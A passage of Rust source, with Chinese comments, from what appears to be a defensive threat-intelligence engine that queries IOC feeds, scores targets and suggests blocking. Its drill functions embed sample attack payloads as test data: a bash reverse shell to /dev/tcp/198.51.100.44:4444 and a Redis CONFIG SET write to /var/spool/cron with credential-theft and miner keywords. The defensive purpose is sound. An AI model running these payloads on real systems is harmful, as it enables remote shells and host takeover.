            Ok(0) => break,
            Ok(n) => {
                raw_resp.extend_from_slice(&chunk[..n]);
                if expected_total.is_none() {
                    if let Some(hdr_end) = raw_resp.windows(4).position(|w| w == b"\r\n\r\n") {
                        let hdr_str = String::from_utf8_lossy(&raw_resp[..hdr_end]);
                        if let Some(cl) = hdr_str.lines().find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            if k.trim().eq_ignore_ascii_case("content-length") {
                                v.trim().parse::<usize>().ok()
                            } else {
                                None
                            }
                        }) {
                            expected_total = Some(hdr_end + 4 + cl);
                        } else {
                            expected_total = Some(usize::MAX);
                        }
                    }
                }
                if let Some(tot) = expected_total {
                    if raw_resp.len() >= tot {
                        break;
                    }
                }
            }
            Err(_) => break,
        }
    }
    let full = String::from_utf8_lossy(&raw_resp).to_string();
    let (head, body) = full.split_once("\r\n\r\n").unwrap_or((&full, ""));
    let code = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(200);
    Ok((code, body.trim().to_string()))
}

/// 跨平台 HTTPS JSON 查询封装：利用 macOS/Win10+ 系统原生 `curl` (Windows 带 `CREATE_NO_WINDOW`)，零 TLS crate 膨胀
fn execute_https_curl_request(
    method: &str,
    url: &str,
    headers: &[(&str, &str)],
    body_opt: Option<&str>,
    timeout_ms: u64,
) -> Result<(u16, String), String> {
    if !url.starts_with("https://") {
        return Err("仅允许 HTTPS 安全地址".to_string());
    }
    if url.chars().any(|c| matches!(c, '\r' | '\n' | '\0')) {
        return Err("非法 URL 控制字符".to_string());
    }
    let max_sec = ((timeout_ms.max(800) + 999) / 1000).clamp(1, 6).to_string();
    let mut cmd = std::process::Command::new("curl");
    cmd.args(["-sS", "--max-time", &max_sec, "-X", method, "-H", "Accept: application/json"]);
    for (k, v) in headers {
        if !k.trim().is_empty() && !v.trim().is_empty() && !k.contains('\r') && !v.contains('\n') {
            cmd.arg("-H").arg(format!("{}: {}", k.trim(), v.trim()));
        }
    }
    if let Some(body) = body_opt {
        cmd.args(["-H", "Content-Type: application/json", "-d", body]);
    }
    cmd.args(["-w", "\n__VNB_HTTP_STATUS__:%{http_code}", url]);

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000);
    }

    let out = cmd
        .output()
        .map_err(|e| format!("调用系统 TLS curl 失败: {}", e))?;
    let stdout = String::from_utf8_lossy(&out.stdout).to_string();
    if !out.status.success() && stdout.trim().is_empty() {
        let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
        return Err(if stderr.is_empty() {
            "HTTPS 连接超时或网络不可达".to_string()
        } else {
            stderr
        });
    }
    if let Some((body, tail)) = stdout.rsplit_once("\n__VNB_HTTP_STATUS__:") {
        let code = tail.trim().parse::<u16>().unwrap_or(200);
        Ok((code, body.trim().to_string()))
    } else {
        Ok((200, stdout.trim().to_string()))
    }
}

fn dispatch_http_or_https_json(
    method: &str,
    url: &str,
    headers: &[(&str, &str)],
    body_opt: Option<&str>,
    timeout_ms: u64,
) -> Result<(u16, String), String> {
    if url.starts_with("http://") {
        execute_plain_http_request(method, url, headers, body_opt, timeout_ms)
    } else if url.starts_with("https://") {
        execute_https_curl_request(method, url, headers, body_opt, timeout_ms)
    } else {
        Err(format!("不支持的情报源协议: {}", url))
    }
}

/// 威胁调查与多情报库联动引擎
pub struct ThreatIntelEngine {
    pub feeds: Vec<ThreatIntelFeedConfig>,
    pub reports: Vec<InvestigationReport>,
    pub custom_malicious_iocs: HashSet<String>,
    pub last_status_message: String,
    next_report_seq: u64,
    persistence_path: Option<PathBuf>,
}

/// 锁外后台威胁调查输入（供 GPUI/Worker 线程脱离 UI 锁并行联查）
#[derive(Debug, Clone)]
pub struct ThreatIntelJobInput {
    pub query_input: String,
    pub pid: u32,
    pub proc_name: String,
    pub file_path_opt: Option<String>,
    pub remote_ip_opt: Option<String>,
    pub port_opt: Option<u16>,
    pub inline_payload_opt: Option<Vec<u8>>,
    pub socket_opt: Option<NetworkSocketRecord>,
    pub ips_events: Vec<IpsEvent>,
    pub local_9006_online: bool,
    pub feeds: Vec<ThreatIntelFeedConfig>,
    pub custom_malicious_iocs: HashSet<String>,
}

/// 锁外后台威胁调查输出（返回主引擎后瞬时合入报告列表与情报统计）
#[derive(Debug, Clone)]
pub struct ThreatIntelJobOutput {
    pub report: InvestigationReport,
    pub feed_updates: Vec<(String, String, u64)>,
}

impl Default for ThreatIntelEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl ThreatIntelEngine {
    pub fn new() -> Self {
        let path = Some(platform::app_file("vnb_threat_intel_config.json"));
        let mut engine = Self::new_internal(path.clone());
        if let Some(ref p) = path {
            engine.load_from_file(p);
        }
        engine
    }

    pub fn new_sandbox() -> Self {
        Self::new_internal(None)
    }

    fn new_internal(persistence_path: Option<PathBuf>) -> Self {
        let mut custom_malicious_iocs = HashSet::new();
        // 内置标准已知测试/EICAR 与文档演练高危 IOC 基线
        custom_malicious_iocs.insert("44d88612fea8a8f36de82e1278abb02f".to_string());
        custom_malicious_iocs.insert("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string()); // EICAR SHA-256
        custom_malicious_iocs.insert("198.51.100.44".to_string());
        custom_malicious_iocs.insert("203.0.113.77".to_string());
        custom_malicious_iocs.insert("45.155.205.11".to_string());
        custom_malicious_iocs.insert("185.220.101.9".to_string());

        Self {
            feeds: build_default_intel_feeds(),
            reports: Vec::new(),
            custom_malicious_iocs,
            last_status_message: "多情报库与网络指纹/代码基因调查引擎就绪（已默认预置 5 个情报接口）".to_string(),
            next_report_seq: 1,
            persistence_path,
        }
    }

    pub fn disable_persistence(&mut self) {
        self.persistence_path = None;
    }

    fn load_from_file(&mut self, path: &Path) {
        let Ok(txt) = fs::read_to_string(path) else {
            return;
        };
        let Ok(saved) = serde_json::from_str::<PersistedThreatIntelConfig>(&txt) else {
            return;
        };
        if !saved.feeds.is_empty() {
            self.feeds = saved.feeds;
        }
        for ioc in saved.custom_malicious_iocs {
            if !ioc.trim().is_empty() {
                self.custom_malicious_iocs.insert(ioc.trim().to_ascii_lowercase());
            }
        }
    }

    pub fn save_persisted(&self) {
        let Some(ref path) = self.persistence_path else {
            return;
        };
        let payload = PersistedThreatIntelConfig {
            feeds: self.feeds.clone(),
            custom_malicious_iocs: self.custom_malicious_iocs.iter().cloned().collect(),
        };
        if let Ok(json) = serde_json::to_string_pretty(&payload) {
            if let Some(parent) = path.parent() {
                let _ = fs::create_dir_all(parent);
            }
            let _ = fs::write(path, json);
        }
    }

    pub fn enabled_feeds_count(&self) -> usize {
        self.feeds.iter().filter(|f| f.enabled).count()
    }

    pub fn toggle_feed(&mut self, feed_id: &str) -> Option<(bool, String)> {
        let mut msg_res = None;
        for f in &mut self.feeds {
            if f.feed_id == feed_id {
                f.enabled = !f.enabled;
                f.last_status = if f.enabled {
                    "已启用待联查".to_string()
                } else {
                    "已停用".to_string()
                };
                msg_res = Some((
                    f.enabled,
                    format!(
                        "[INTEL-FEED] {} ({}) -> {}",
                        f.feed_id,
                        f.name,
                        if f.enabled { "已启用" } else { "已停用" }
                    ),
                ));
                break;
            }
        }
        if let Some((_, ref msg)) = msg_res {
            self.last_status_message = msg.clone();
            self.save_persisted();
        }
        msg_res
    }

    pub fn update_feed_config(
        &mut self,
        feed_id: &str,
        endpoint_url: &str,
        api_key: &str,
        enabled_opt: Option<bool>,
    ) -> Result<String, String> {
        let clean_url = endpoint_url.trim();
        if clean_url.is_empty() {
            return Err("情报接口 URL 不能为空".to_string());
        }
        if !(clean_url.starts_with("http://")
            || clean_url.starts_with("https://")
            || clean_url.starts_with("builtin://"))
        {
            return Err("情报接口必须以 http://、https:// 或 builtin:// 开头".to_string());
        }
        let Some(feed) = self.feeds.iter_mut().find(|f| f.feed_id == feed_id) else {
            return Err(format!("未找到情报源 {}", feed_id));
        };
        feed.endpoint_url = clean_url.to_string();
        feed.api_key = api_key.trim().to_string();
        if let Some(en) = enabled_opt {
            feed.enabled = en;
        }
        feed.last_status = if feed.enabled {
            "配置已更新 · 已启用".to_string()
        } else {
            "配置已更新 · 未启用".to_string()
        };
        let msg = format!(
            "[INTEL-CONFIG] 已更新情报接口 {} -> {} (启用={})",
            feed.name, feed.endpoint_url, feed.enabled
        );
        self.last_status_message = msg.clone();
        self.save_persisted();
        Ok(msg)
    }

    pub fn add_custom_feed(
        &mut self,
        name: &str,
        endpoint_url: &str,
        auth_header_name: &str,
        api_key: &str,
    ) -> Result<String, String> {
        let clean_url = endpoint_url.trim();
        if clean_url.is_empty() || (!clean_url.starts_with("http://") && !clean_url.starts_with("https://")) {
            return Err("自定义情报接口 URL 必须以 http:// 或 https:// 开头".to_string());
        }
        let feed_id = format!("FEED-CUSTOM-{:03}", self.feeds.len() + 1);
        let clean_name = if name.trim().is_empty() {
            format!("自定义情报源 #{}", self.feeds.len() + 1)
        } else {
            name.trim().to_string()
        };
        let header = if auth_header_name.trim().is_empty() {
            "Authorization"
        } else {
            auth_header_name.trim()
        };
        self.feeds.push(ThreatIntelFeedConfig {
            feed_id: feed_id.clone(),
            name: clean_name.clone(),
            kind: IntelFeedKind::CustomRestTip,
            endpoint_url: clean_url.to_string(),
            auth_header_name: header.to_string(),
            api_key: api_key.trim().to_string(),
            enabled: true,
            weight: 0.90,
            timeout_ms: 2500,
            supports_ip: true,
            supports_hash_gene: true,
            description: format!("用户自定义 REST/STIX 威胁情报联动接口 ({})", clean_url),
            is_builtin_default: false,
            last_status: "已启用 · 等待联查".to_string(),
            total_queries: 0,
            total_hits: 0,
        });
        let msg = format!("[INTEL-ADD] 已新增并启用自定义情报库 {} ({})", feed_id, clean_name);
        self.last_status_message = msg.clone();
        self.save_persisted();
        Ok(feed_id)
    }

    pub fn remove_feed(&mut self, feed_id: &str) -> bool {
        let before = self.feeds.len();
        self.feeds.retain(|f| !(f.feed_id == feed_id && !f.is_builtin_default));
        let removed = self.feeds.len() < before;
        if removed {
            self.last_status_message = format!("[INTEL-DEL] 已移除自定义情报源 {}", feed_id);
            self.save_persisted();
        }
        removed
    }

    pub fn reset_default_feeds(&mut self) -> String {
        self.feeds = build_default_intel_feeds();
        let msg = format!("[INTEL-RESET] 已恢复 {} 个默认预置情报库配置", self.feeds.len());
        self.last_status_message = msg.clone();
        self.save_persisted();
        msg
    }

    fn query_single_feed(
        feed: &mut ThreatIntelFeedConfig,
        net_fp: &NetworkAttackFingerprint,
        gene: &CodeGeneProfile,
        custom_iocs: &HashSet<String>,
        local_9006_online: bool,
    ) -> IntelFeedMatch {
        let t0 = Instant::now();
        feed.total_queries += 1;
        let ip_clean = net_fp.remote_ip.trim().to_ascii_lowercase();
        let sha_clean = gene.file_sha256.trim().to_ascii_lowercase();

        let match_res = match feed.kind {
            IntelFeedKind::BuiltinOfflineGeneVault => {
                let mut tags = Vec::new();
                let mut conf = 0.0f32;
                let ip_hit = !ip_clean.is_empty() && custom_iocs.contains(&ip_clean);
                let hash_hit = !sha_clean.is_empty() && custom_iocs.contains(&sha_clean);
                if ip_hit {
                    tags.push(format!("C2/高危 IP IOC: {}", ip_clean));
                    conf = conf.max(0.92);
                }
                if hash_hit {
                    tags.push(format!("已知恶意样本 Hash: {}...", &sha_clean[..12]));
                    conf = conf.max(0.96);
                }
                if net_fp.network_risk_score >= 0.72 {
                    tags.push(format!("网络指纹族命中: {}", net_fp.protocol_family));
                    conf = conf.max(net_fp.network_risk_score);
                }
                if gene.gene_risk_score >= 0.65 {
                    tags.push(format!(
                        "代码基因命中: {} ({:.0}%)",
                        gene.closest_gene_family, gene.gene_similarity_pct
                    ));
                    conf = conf.max(gene.gene_risk_score);
                }
                let matched = !tags.is_empty();
                if matched {
                    feed.total_hits += 1;
                }
                feed.last_status = if matched {
                    format!("命中 ({:.0}%)", conf * 100.0)
                } else {
                    "干净 · 无已知 IOC/基因命中".to_string()
                };
                IntelFeedMatch {
                    feed_id: feed.feed_id.clone(),
                    feed_name: feed.name.clone(),
                    status: if matched { "HIT-MALICIOUS" } else { "CLEAN" }.to_string(),
                    matched,
                    confidence: conf,
                    threat_tags: if matched {
                        tags.clone()
                    } else {
                        vec!["离线高危 IOC 与基因簇未命中".to_string()]
                    },
                    raw_summary: if matched {
                        tags.join(" | ")
                    } else {
                        "已核验本地高危 C2 IP、EICAR/恶意 Hash 与 5 类代码基因指纹".to_string()
                    },
                    latency_ms: t0.elapsed().as_millis() as u64,
                }
            }
            IntelFeedKind::Local9006SystemOneBrain => {
                let mut matched = false;
                let mut conf = 0.0f32;
                let mut tags = Vec::new();
                let summary;
                let is_local_9006 = feed.endpoint_url.contains("127.0.0.1:9006")
                    || feed.endpoint_url.contains("localhost:9006");
                let call_res = if !local_9006_online && is_local_9006 {
                    Err("local 9006 offline".to_string())
                } else {
                    let body = serde_json::json!({
                        "op": "evaluate",
                        "input": format!(
                            "NETFP={} IP={} PORT={} | DNA={} FAMILY={} GENES={:?}",
                            net_fp.t5b8_hex,
                            net_fp.remote_ip,
                            net_fp.port,
                            gene.gene_simhash_64,
                            gene.closest_gene_family,
                            gene.extracted_api_genes
                        )
                    })
                    .to_string();
                    let hdrs = [
                        (feed.auth_header_name.as_str(), feed.api_key.as_str()),
                    ];
                    dispatch_http_or_https_json(
                        "POST",
                        &feed.endpoint_url,
                        &hdrs,
                        Some(&body),
                        feed.timeout_ms,
                    )
                };
                match call_res {
                    Ok((code, resp)) if code < 400 => {
                        if let Ok(val) = serde_json::from_str::<serde_json::Value>(&resp) {
                            let simhash = val["binary_simhash"].as_str().unwrap_or("-");
                            let route_score = val["threat_score"]
                                .as_f64()
                                .or_else(|| val["score"].as_f64())
                                .unwrap_or(0.0) as f32;
                            let combined = (net_fp.network_risk_score * 0.5 + gene.gene_risk_score * 0.5)
                                .max(route_score.clamp(0.0, 1.0));
                            matched = combined >= 0.60 || val["malicious"].as_bool() == Some(true);
                            conf = combined;
                            tags.push(format!("9006 SimHash={} · 协同评分={:.0}%", simhash, conf * 100.0));
                            summary = format!("9006 System-1 响应 HTTP {}: SimHash={}", code, simhash);
                        } else {
                            summary = format!("9006 响应 HTTP {} (已采集本地指纹)", code);
                        }
                        feed.last_status = format!("在线响应 HTTP {}", code);
                    }
                    _ => {
                        let fallback_conf = net_fp.network_risk_score.max(gene.gene_risk_score) * 0.85;
                        matched = fallback_conf >= 0.62;
                        conf = fallback_conf;
                        summary = if local_9006_online {
                            "9006 接口超时，已回退本地三元算子评估".to_string()
                        } else {
                            "9006 网关未启动，自动降级为本地 T5B8 + DNA 协同研判".to_string()
                        };
                        tags.push(format!("本地退化协同分={:.0}%", conf * 100.0));
                        feed.last_status = "本地降级模式".to_string();
                    }
                }
                if matched {
                    feed.total_hits += 1;
                }
                IntelFeedMatch {
                    feed_id: feed.feed_id.clone(),
                    feed_name: feed.name.clone(),
                    status: if matched { "HIT-COGNITIVE" } else { "PASS" }.to_string(),
                    matched,
                    confidence: conf,
                    threat_tags: tags,
                    raw_summary: summary,
                    latency_ms: t0.elapsed().as_millis() as u64,
                }
            }
            IntelFeedKind::AlienVaultOtx | IntelFeedKind::AbuseChThreatFox | IntelFeedKind::VirusTotalV3 | IntelFeedKind::CustomRestTip => {
                // 检查外部公网商业/社区接口是否缺关键 API Key
                let needs_key = matches!(
                    feed.kind,
                    IntelFeedKind::VirusTotalV3 | IntelFeedKind::AlienVaultOtx | IntelFeedKind::AbuseChThreatFox
                );
                if needs_key && feed.api_key.trim().is_empty() && feed.endpoint_url.starts_with("https://") {
                    feed.last_status = "缺少 API Key · 跳过公网调用".to_string();
                    return IntelFeedMatch {
                        feed_id: feed.feed_id.clone(),
                        feed_name: feed.name.clone(),
                        status: "AUTH_REQUIRED".to_string(),
                        matched: false,
                        confidence: 0.0,
                        threat_tags: vec![format!("请在“情报库配置”填入 {}", feed.auth_header_name)],
                        raw_summary: format!("未填写 {}，已跳过远程 HTTPS 请求", feed.auth_header_name),
                        latency_ms: 0,
                    };
                }

                let is_ip = looks_like_ipv4_or_v6(&ip_clean)
                    && ip_clean != "127.0.0.1"
                    && ip_clean != "::1"
                    && ip_clean != "*";
                let base = feed.endpoint_url.trim_end_matches('/');
                let (method, req_url, req_body): (&str, String, Option<String>) = match feed.kind {
                    IntelFeedKind::AlienVaultOtx => {
                        if is_ip {
                            ("GET", format!("{}/IPv4/{}/general", base, ip_clean), None)
                        } else {
                            ("GET", format!("{}/file/{}/general", base, sha_clean), None)
                        }
                    }
                    IntelFeedKind::VirusTotalV3 => {
                        if is_ip {
                            ("GET", format!("{}/ip_addresses/{}", base, ip_clean), None)
                        } else {
                            ("GET", format!("{}/files/{}", base, sha_clean), None)
                        }
                    }
                    IntelFeedKind::AbuseChThreatFox => {
                        let ioc_term = if is_ip { &ip_clean } else { &sha_clean };
                        (
                            "POST",
                            format!("{}/", base),
                            Some(serde_json::json!({ "query": "search_ioc", "search_term": ioc_term }).to_string()),
                        )
                    }
                    IntelFeedKind::CustomRestTip => (
                        "POST",
                        feed.endpoint_url.clone(),
                        Some(
                            serde_json::json!({
                                "ip": ip_clean,
                                "port": net_fp.port,
                                "sha256": sha_clean,
                                "gene_simhash": gene.gene_simhash_64,
                                "t5b8": net_fp.t5b8_hex,
                                "process": gene.sample_name
                            })
                            .to_string(),
                        ),
                    ),
                    _ => unreachable!(),
                };

                let hdr_pair = (feed.auth_header_name.as_str(), feed.api_key.as_str());
                match dispatch_http_or_https_json(
                    method,
                    &req_url,
                    &[hdr_pair],
                    req_body.as_deref(),
                    feed.timeout_ms,
                ) {
                    Ok((code, body)) if (200..300).contains(&code) => {
                        let (matched, conf, tags, raw_msg) = parse_external_intel_json(feed.kind, &body);
                        if matched {
                            feed.total_hits += 1;
                        }
                        feed.last_status = format!(
                            "HTTP {} · {}",
                            code,
                            if matched { "命中告警" } else { "未见恶意记录" }
                        );
                        IntelFeedMatch {
                            feed_id: feed.feed_id.clone(),
                            feed_name: feed.name.clone(),
                            status: if matched { "HIT-EXTERNAL" } else { "CLEAN-EXTERNAL" }.to_string(),
                            matched,
                            confidence: conf,
                            threat_tags: tags,
                            raw_summary: raw_msg,
                            latency_ms: t0.elapsed().as_millis() as u64,
                        }
                    }
                    Ok((code, body)) => {
                        feed.last_status = format!("HTTP {} 异常", code);
                        let preview: String = body.chars().take(100).collect();
                        IntelFeedMatch {
                            feed_id: feed.feed_id.clone(),
                            feed_name: feed.name.clone(),
                            status: format!("HTTP_{}", code),
                            matched: false,
                            confidence: 0.0,
                            threat_tags: vec![format!("接口返回状态 HTTP {}", code)],
                            raw_summary: preview,
                            latency_ms: t0.elapsed().as_millis() as u64,
                        }
                    }
                    Err(err) => {
                        feed.last_status = "连接超时/不可达".to_string();
                        IntelFeedMatch {
                            feed_id: feed.feed_id.clone(),
                            feed_name: feed.name.clone(),
                            status: "UNREACHABLE".to_string(),
                            matched: false,
                            confidence: 0.0,
                            threat_tags: vec!["远程接口不可达或超时".to_string()],
                            raw_summary: err,
                            latency_ms: t0.elapsed().as_millis() as u64,
                        }
                    }
                }
            }
        };
        match_res
    }

    /// 打包目标调查任务所需的只读上下文快照（无锁、零 I/O）
    #[allow(clippy::too_many_arguments)]
    pub fn prepare_target_job(
        &self,
        query_input: &str,
        pid: u32,
        proc_name: &str,
        file_path_opt: Option<&str>,
        remote_ip_opt: Option<&str>,
        port_opt: Option<u16>,
        inline_payload_opt: Option<&[u8]>,
        socket_opt: Option<&NetworkSocketRecord>,
        ips_events: &[IpsEvent],
        local_9006_online: bool,
    ) -> ThreatIntelJobInput {
        ThreatIntelJobInput {
            query_input: query_input.to_string(),
            pid,
            proc_name: proc_name.to_string(),
            file_path_opt: file_path_opt.map(str::to_string),
            remote_ip_opt: remote_ip_opt.map(str::to_string),
            port_opt,
            inline_payload_opt: inline_payload_opt.map(|b| b.to_vec()),
            socket_opt: socket_opt.cloned(),
            ips_events: ips_events.to_vec(),
            local_9006_online,
            feeds: self.feeds.clone(),
            custom_malicious_iocs: self.custom_malicious_iocs.clone(),
        }
    }

    /// 打包内置攻防调查演练探针任务快照（与同步模式共用统一执行管线）
    pub fn prepare_drill_job(
        &self,
        drill_kind: &str,
        live_procs: &[LiveProcessRecord],
        sockets: &[NetworkSocketRecord],
        ips_events: &[IpsEvent],
        local_9006_online: bool,
    ) -> ThreatIntelJobInput {
        match drill_kind {
            "revshell_loader" => {
                let sample = b"#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.44/4444 0>&1\n# VirtualAlloc CreateRemoteThread pty.spawn('sh')\n\x90\x90\x90\x90\x90\x90\x0f\x05";
                self.prepare_target_job(
                    "198.51.100.44:4444",
                    39102,
                    "loader_dropper",
                    None,
                    Some("198.51.100.44"),
                    Some(4444),
                    Some(sample),
                    None,
                    ips_events,
                    local_9006_online,
                )
            }
            "redis_rce_cred" => {
                let sample = b"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\nsekurlsa mimikatz .ssh/id_rsa frpc stratum+tcp\n";
                self.prepare_target_job(
                    "45.155.205.11:6379",
                    6379,
                    "redis_exploit_probe",
                    None,
                    Some("45.155.205.11"),
                    Some(6379),
                    Some(sample),
                    None,
                    ips_events,
                    local_9006_online,
                )
            }
            "self_exe_clean" => {
                let exe = std::env::current_exe()
                    .map(|p| p.to_string_lossy().into_owned())
                    .unwrap_or_default();
                self.prepare_target_job(
                    &exe,
                    std::process::id(),
                    "vnb-security-assistant",
                    Some(&exe),
                    Some("127.0.0.1"),
                    Some(9006),
                    None,
                    None,
                    ips_events,
                    local_9006_online,
                )
            }
            _ => {
                if let Some(s) = sockets
                    .iter()
                    .find(|s| s.is_c2_suspicious || s.is_wildcard_exposed)
                    .or_else(|| sockets.first())
                {
                    self.prepare_target_job(
                        &s.remote_endpoint,
                        s.pid,
                        &s.process_name,
                        Some(&s.exe_path),
                        Some(&s.remote_ip),
                        Some(if s.remote_port > 0 { s.remote_port } else { s.local_port }),
                        None,
                        Some(s),
                        ips_events,
                        local_9006_online,
                    )
                } else if let Some(p) = live_procs.first() {
                    self.prepare_target_job(
                        &p.exe_path,
                        p.pid,
                        &p.comm,
                        Some(&p.exe_path),
                        None,
                        None,
                        None,
                        None,
                        ips_events,
                        local_9006_online,
                    )
                } else {
                    self.prepare_target_job(
                        "127.0.0.1:9006",
                        std::process::id(),
                        "localhost",
                        None,
                        Some("127.0.0.1"),
                        Some(9006),
                        Some(b"GET /health HTTP/1.1\r\nHost: 127.0.0.1:9006\r\n\r\n"),
                        None,
                        ips_events,
                        local_9006_online,
                    )
                }
            }
        }
    }

    /// 锁外并行执行多情报源联网联查与代码基因评估（将 N 路顺序阻塞压降至 max(单源耗时)）
    pub fn execute_job_offline(job: ThreatIntelJobInput) -> ThreatIntelJobOutput {
        let trimmed = job.query_input.trim();
        let (parsed_ip, parsed_port) = split_ip_port(trimmed);
        let eff_ip = job
            .remote_ip_opt
            .clone()
            .filter(|s| !s.is_empty())
            .or_else(|| {
                if looks_like_ipv4_or_v6(&parsed_ip) {
                    Some(parsed_ip.clone())
                } else {
                    None
                }
            })
            .or_else(|| job.socket_opt.as_ref().map(|s| s.remote_ip.clone()))
            .unwrap_or_default();
        let eff_port = job
            .port_opt
            .filter(|&p| p > 0)
            .or(if parsed_port > 0 { Some(parsed_port) } else { None })
            .or_else(|| {
                job.socket_opt
                    .as_ref()
                    .map(|s| if s.remote_port > 0 { s.remote_port } else { s.local_port })
            })
            .unwrap_or(0);
        let eff_file_owned = job
            .file_path_opt
            .clone()
            .filter(|s| !s.is_empty())
            .or_else(|| {
                if Path::new(trimmed).exists() {
                    Some(trimmed.to_string())
                } else {
                    None
                }
            })
            .unwrap_or_default();
        let direct_sha = if looks_like_sha256(trimmed) {
            Some(trimmed)
        } else {
            None
        };

        let target_endpoint = if !eff_ip.is_empty() && eff_port > 0 {
            format!("{}:{}", eff_ip, eff_port)
        } else if !eff_ip.is_empty() {
            eff_ip.clone()
        } else if !trimmed.is_empty() {
            trimmed.to_string()
        } else {
            eff_file_owned.clone()
        };

        let net_fp = extract_network_attack_fingerprint(
            &target_endpoint,
            &eff_ip,
            eff_port,
            &job.proc_name,
            job.inline_payload_opt.as_deref(),
            job.socket_opt.as_ref(),
            &job.ips_events,
        );
        let code_gene = extract_code_gene_profile(
            &eff_file_owned,
            job.inline_payload_opt.as_deref(),
            &job.proc_name,
            direct_sha,
        );

        let mut enabled_feeds: Vec<ThreatIntelFeedConfig> =
            job.feeds.into_iter().filter(|f| f.enabled).collect();
        let feed_results: Vec<(IntelFeedMatch, String, u64, String, f32)> =
            if enabled_feeds.len() <= 1 {
                enabled_feeds
                    .iter_mut()
                    .map(|feed| {
                        let before = feed.total_hits;
                        let m = Self::query_single_feed(
                            feed,
                            &net_fp,
                            &code_gene,
                            &job.custom_malicious_iocs,
                            job.local_9006_online,
                        );
                        let delta = feed.total_hits.saturating_sub(before);
                        (
                            m,
                            feed.last_status.clone(),
                            delta,
                            feed.feed_id.clone(),
                            feed.weight,
                        )
                    })
                    .collect()
            } else {
                std::thread::scope(|s| {
                    let net_ref = &net_fp;
                    let gene_ref = &code_gene;
                    let iocs_ref = &job.custom_malicious_iocs;
                    let online_9006 = job.local_9006_online;
                    let handles: Vec<_> = enabled_feeds
                        .iter_mut()
                        .map(|feed| {
                            s.spawn(move || {
                                let before = feed.total_hits;
                                let m = Self::query_single_feed(
                                    feed,
                                    net_ref,
                                    gene_ref,
                                    iocs_ref,
                                    online_9006,
                                );
                                let delta = feed.total_hits.saturating_sub(before);
                                (
                                    m,
                                    feed.last_status.clone(),
                                    delta,
                                    feed.feed_id.clone(),
                                    feed.weight,
                                )
                            })
                        })
                        .collect();
                    handles.into_iter().filter_map(|h| h.join().ok()).collect()
                })
            };

        let mut feed_matches = Vec::with_capacity(feed_results.len());
        let mut feed_updates = Vec::with_capacity(feed_results.len());
        let mut weighted_score_sum = 0.0f32;
        let mut weight_sum = 0.0f32;
        let mut hits_cnt = 0usize;

        for (m, last_status, delta, fid, weight) in feed_results {
            if m.matched {
                hits_cnt += 1;
            }
            weighted_score_sum += m.confidence * weight;
            weight_sum += weight;
            feed_matches.push(m);
            feed_updates.push((fid, last_status, delta));
        }

        let queried_cnt = feed_matches.len();
        let avg_feed_score = if weight_sum > 0.0 {
            weighted_score_sum / weight_sum
        } else {
            0.0
        };
        let local_signal = net_fp.network_risk_score.max(code_gene.gene_risk_score);
        let fused_01 = (local_signal * 0.55 + avg_feed_score * 0.45)
            .max(if hits_cnt > 0 { local_signal.max(avg_feed_score) } else { local_signal * 0.8 });
        let fused_score = ((fused_01.clamp(0.0, 1.0)) * 100.0 * 10.0).round() / 10.0;

        let verdict_level = if fused_score >= 78.0 || hits_cnt >= 2 {
            "CONFIRMED_MALICIOUS"
        } else if fused_score >= 48.0 || hits_cnt == 1 {
            "HIGH_SUSPICION"
        } else if fused_score >= 25.0 {
            "LOW_RISK"
        } else {
            "CLEAN"
        }
        .to_string();

        let mut actions = Vec::new();
        if fused_score >= 48.0 {
            if !eff_ip.is_empty() && eff_ip != "127.0.0.1" && eff_ip != "::1" {
                actions.push(format!("通过主机防火墙双向阻断可疑端点 {}", eff_ip));
            }
            if job.pid > 0 && job.pid != std::process::id() {
                actions.push(format!("冻结或终止关联高危进程 {} (PID={})", job.proc_name, job.pid));
            }
            actions.push(format!("将 SHA-256 ({}...) 与网络指纹写入本地长期情报库", &code_gene.file_sha256[..12]));
        } else {
            actions.push("未发现明确恶意网络指纹与高危代码基因，保持常态监控".to_string());
        }

        let report = InvestigationReport {
            report_id: String::new(),
            timestamp: now_hms(),
            query_input: if trimmed.is_empty() { target_endpoint } else { trimmed.to_string() },
            pid: job.pid,
            process_name: if job.proc_name.is_empty() {
                "Manual-Target".to_string()
            } else {
                job.proc_name
            },
            network_fp: net_fp,
            code_gene,
            feed_matches,
            feeds_queried_count: queried_cnt,
            feeds_hit_count: hits_cnt,
            fused_threat_score: fused_score,
            verdict_level,
            recommended_actions: actions,
            linked_mitigation_done: false,
        };

        ThreatIntelJobOutput {
            report,
            feed_updates,
        }
    }

    /// 将后台情报联查结果合入引擎状态并生成顺序报告编号
    pub fn commit_job_output(&mut self, mut out: ThreatIntelJobOutput) -> InvestigationReport {
        for (fid, status, hit_delta) in out.feed_updates {
            if let Some(feed) = self.feeds.iter_mut().find(|f| f.feed_id == fid) {
                feed.last_status = status;
                feed.total_hits = feed.total_hits.saturating_add(hit_delta);
            }
        }
        let report_id = format!("INV-{:04}", self.next_report_seq);
        self.next_report_seq += 1;
        out.report.report_id = report_id.clone();

        self.last_status_message = format!(
            "[INVESTIGATE] {} 调查完成: {} (评分={:.1}/100 · 情报命中 {}/{})",
            report_id,
            out.report.verdict_level,
            out.report.fused_threat_score,
            out.report.feeds_hit_count,
            out.report.feeds_queried_count
        );
        self.reports.insert(0, out.report.clone());
        let max_reports = if crate::platform::detect_host_hardware_profile().tier
            == crate::platform::HostComputeTier::LowSpec
        {
            32
        } else {
            64
        };
        if self.reports.len() > max_reports {
            self.reports.truncate(max_reports);
        }
        out.report
    }

    /// 发起完整网络攻击指纹 + 代码基因 + 多情报库联动调查
    #[allow(clippy::too_many_arguments)]
    pub fn investigate_target(
        &mut self,
        query_input: &str,
        pid: u32,
        proc_name: &str,
        file_path_opt: Option<&str>,
        remote_ip_opt: Option<&str>,
        port_opt: Option<u16>,
        inline_payload_opt: Option<&[u8]>,
        socket_opt: Option<&NetworkSocketRecord>,
        ips_events: &[IpsEvent],
        local_9006_online: bool,
    ) -> InvestigationReport {
        let job = self.prepare_target_job(
            query_input,
            pid,
            proc_name,
            file_path_opt,
            remote_ip_opt,
